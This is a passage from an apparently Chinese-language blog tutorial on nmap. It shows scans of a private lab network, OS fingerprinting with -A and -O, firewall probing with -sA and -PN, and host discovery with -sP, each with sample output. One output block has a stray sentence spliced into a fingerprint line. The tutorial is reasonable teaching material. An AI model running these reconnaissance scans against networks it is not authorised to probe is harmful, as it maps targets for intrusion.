class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">11</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server1.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.100</span>):</span><br><span class="line">Not shown: <span class="number">1677</span> closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">111</span>/tcp <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">851</span>/tcp <span class="keyword">open</span>  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">256</span> IP addresses (<span class="number">2</span> hosts <span class="keyword">up</span>) scanned in <span class="number">5.550</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="5-使用IP地址的最后一个字节扫描多台服务器-，"><a href="#5-使用IP地址的最后一个字节扫描多台服务器-，" class="headerlink" title="5.使用IP地址的最后一个字节扫描多台服务器 ，"></a>5.使用IP地址的最后一个字节扫描多台服务器 ，</h3><p>你可以简单的指定IP地址的最后一个字节来对多个IP地址进行扫描。例如，我在下面执行中扫描了IP地址192.168.0.101，192.168.0.102和192.168.0.103。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span>,<span class="number">102</span>,<span class="number">103</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">09</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.552</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="6-从一个文件中扫描主机列表-iL"><a href="#6-从一个文件中扫描主机列表-iL" class="headerlink" title="6. 从一个文件中扫描主机列表 -iL"></a>6. 从一个文件中扫描主机列表 -iL</h3><p>如果你有多台主机需要扫描且所有主机信息都写在一个文件中，那么你可以直接让nmap读取该文件来执行扫描，让我们来看看如何做到这一点。</p><p>创建一个名为“nmaptest.txt ”的文本文件，并定义所有你想要扫描的服务器IP地址或主机名。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[root@server1 ~]</span># <span class="selector-tag">cat</span>  <span class="selector-tag">nmaptest</span><span class="selector-class">.txt</span> </span><br><span class="line"><span class="selector-tag">localhost</span></span><br><span class="line"><span class="selector-tag">server2</span><span class="selector-class">.tecmint</span><span class="selector-class">.com</span></span><br><span class="line">192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.101</span></span><br></pre></td></tr></table></figure><p>接下来运行带“iL”选项的nmap命令来扫描文件中列出的所有IP地址</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -iL nmaptest.txt </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">10</span>:<span class="number">58</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> localhost.localdomain (<span class="number">127.0</span>.<span class="number">0.1</span>):</span><br><span class="line">Not shown: <span class="number">1675</span> closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">25</span>/tcp  <span class="keyword">open</span>  smtp</span><br><span class="line"><span class="number">111</span>/tcp <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">631</span>/tcp <span class="keyword">open</span>  ipp</span><br><span class="line"><span class="number">857</span>/tcp <span class="keyword">open</span>  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">958</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">958</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.047</span> seconds</span><br></pre></td></tr></table></figure><h3 id="7-扫描一个IP地址范围"><a href="#7-扫描一个IP地址范围" class="headerlink" title="7.扫描一个IP地址范围 -"></a>7.扫描一个IP地址范围 -</h3><p>你可以在nmap执行扫描时指定IP范围。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span>-<span class="number">110</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">09</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: <span class="number">10</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.542</span> seconds</span><br></pre></td></tr></table></figure><h3 id="8-排除一些远程主机后再扫描–exclude"><a href="#8-排除一些远程主机后再扫描–exclude" class="headerlink" title="8.排除一些远程主机后再扫描–exclude"></a>8.排除一些远程主机后再扫描–exclude</h3><p>在执行全网扫描或用通配符扫描时你可以使用“–exclude”选项来排除某些你不想要扫描的主机。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.* --exclude <span class="number">192.168</span>.<span class="number">0.100</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">16</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">255</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">5.313</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="9-扫描操作系统信息和路由跟踪-A"><a href="#9-扫描操作系统信息和路由跟踪-A" class="headerlink" title="9.扫描操作系统信息和路由跟踪-A"></a>9.扫描操作系统信息和路由跟踪-A</h3><p>使用Nmap，你可以检测远程主机上运行的操作系统和版本。为了启用操作系统和版本检测，脚本扫描和路由跟踪功能，我们可以使用NMAP的“<strong>-A</strong>“选项。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -<span class="type">A</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">16</span>:<span class="number">25</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((<span class="type">CentOS</span>))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line">No exact OS matches for host (<span class="type">If</span> you know what <span class="type">OS</span> is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(<span class="type">V</span>=4.11%<span class="type">P</span>=i686-redhat-linux-gnu%<span class="type">D</span>=11/11%<span class="type">Tm</span>=52814B66%<span class="type">O</span>=22%<span class="type">C</span>=1%<span class="type">M</span>=080027)</span><br><span class="line">TSeq(<span class="type">Class</span>=<span class="type">TR</span>%<span class="type">IPID</span>=<span class="type">Z</span>%<span class="type">TS</span>=1000HZ)</span><br><span class="line">T1(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T2(<span class="type">Resp</span>=<span class="type">N</span>)</span><br><span class="line">T3(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T4(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T5(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">T6(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T7(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">PU(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">N</span>%<span class="type">TOS</span>=<span class="type">C0</span>%<span class="type">IPLEN</span>=164%<span class="type">RIPTL</span>=148%<span class="type">RID</span>=<span class="type">E</span>%<span class="type">RIPCK</span>=<span class="type">E</span>%<span class="type">UCK</span>=<span class="type">E</span>%<span class="type">ULEN</span>=134%<span class="type">DAT</span>=<span class="type">E</span>)</span><br><span class="line"> </span><br><span class="line">Uptime 0.169 days (since <span class="type">Mon</span> <span class="type">Nov</span> 11 12:22:15 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 22.271 seconds</span><br></pre></td></tr></table></figure><p>从上面的输出你可以看到，Nmap显示出了远程主机<strong>操作系统的TCP</strong> / <strong>IP</strong>协议指纹，并且更加具体的显示出远程主机上的端口和服务。</p><h3 id="10-启用Nmap的操作系统探测功能-O"><a href="#10-启用Nmap的操作系统探测功能-O" class="headerlink" title="10.启用Nmap的操作系统探测功能-O"></a>10.启用Nmap的操作系统探测功能-O</h3><p>使用选项“<strong>-O</strong>”和“<strong>-osscan-guess</strong>”也帮助探测操作系统信息。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -<span class="type">O</span> server2.tecmint.com</span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">17</span>:<span class="number">40</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line">No exact OS matches for host (<span class="type">If</span> you know what <span class="type">OS</span> is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(<span class="type">V</span>=4.11%<span class="type">P</span>=i686-redhat-linux-gnu%<span class="type">D</span>=11/11%<span class="type">Tm</span>=52815CF4%<span class="type">O</span>=22%<span class="type">C</span>=1%<span class="type">M</span>=080027)</span><br><span class="line">TSeq(<span class="type">Class</span>=<span class="type">TR</span>%<span class="type">IPID</span>=<span class="type">Z</span>%<span class="type">TS</span>=1000HZ)</span><br><span class="line">T1(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T2(<span class="type">Resp</span>=<span class="type">N</span>)</span><br><span class="line">T3(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T4(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">Option</span> -<span class="type">O</span> and -osscan-guess also helps to discover <span class="type">OS</span></span><br><span class="line"><span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T5(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">T6(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T7(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">PU(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">N</span>%<span class="type">TOS</span>=<span class="type">C0</span>%<span class="type">IPLEN</span>=164%<span class="type">RIPTL</span>=148%<span class="type">RID</span>=<span class="type">E</span>%<span class="type">RIPCK</span>=<span class="type">E</span>%<span class="type">UCK</span>=<span class="type">E</span>%<span class="type">ULEN</span>=134%<span class="type">DAT</span>=<span class="type">E</span>)</span><br><span class="line"> </span><br><span class="line">Uptime 0.221 days (since <span class="type">Mon</span> <span class="type">Nov</span> 11 12:22:16 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 11.064 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="11-扫描主机侦测防火墙-sA"><a href="#11-扫描主机侦测防火墙-sA" class="headerlink" title="11.扫描主机侦测防火墙-sA"></a>11.扫描主机侦测防火墙-sA</h3><p>下面的命令将扫描远程主机以探测该主机是否使用了包过滤器或防火墙。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sA <span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) <span class="meta">at</span> <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">27</span> EST</span><br><span class="line">All <span class="number">1680</span> scanned ports on server2.tecmint.com (<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span>) are UNfiltered</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.382</span> seconds</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="12-扫描主机检测是否有防火墙保护-PN"><a href="#12-扫描主机检测是否有防火墙保护-PN" class="headerlink" title="12.扫描主机检测是否有防火墙保护-PN"></a>12.扫描主机检测是否有防火墙保护-PN</h3><p>扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PN <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">30</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.399</span> seconds</span><br></pre></td></tr></table></figure><h3 id="13-找出网络中的在线主机-sP"><a href="#13-找出网络中的在线主机-sP" class="headerlink" title="13.找出网络中的在线主机-sP"></a>13.找出网络中的在线主机-sP</h3><p>使用“<strong>-sP</strong>”选项，我们可以简单的检测网络中有哪些在线主机，该选项会跳过端口扫描和其他一些检测。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sP <span class="number">192.168</span>.<span class="number">0</span>.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">11</span>:<span class="number">01</span> EST</span><br><span class="line">Host server1.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.100</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span 